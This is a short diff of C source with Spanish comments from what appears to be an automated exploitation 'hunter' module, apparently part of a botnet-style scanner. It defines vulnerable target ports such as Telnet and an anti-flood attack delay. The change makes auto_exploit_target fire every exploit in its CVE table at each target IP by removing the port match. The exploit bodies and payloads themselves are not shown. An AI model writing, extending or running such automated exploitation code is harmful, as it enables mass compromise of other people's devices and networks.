@@ -17,6 +17,9 @@
 #define SCAN_TIMEOUT_MS 2000        // Timeout por puerto (2s)
 #define ATTACK_DELAY_MS 100         // Delay entre ataques (anti-flood)
 
+// Forward declarations
+void *hunter_stats_reporter(void *arg);
+
 // Puertos vulnerables comunes
 int hunter_ports[] = {
     23,    // Telnet
@@ -193,11 +196,10 @@ int auto_exploit_target(HunterTarget *target) {
         extern Exploit exploits[];
         extern int exploit_count;
         
+        // Probar todos los exploits HTTP (no verificamos puerto porque la struct no lo tiene)
         for (int i = 0; i < exploit_count && !success; i++) {
-            if (exploits[i].port == target->port || exploits[i].port == 0) {
-                success = execute_exploit_cve(target->ip, &exploits[i]);
-                if (success) break;
-            }
+            success = execute_exploit_cve(target->ip, &exploits[i]);
+            if (success) break;
         }
     }
     
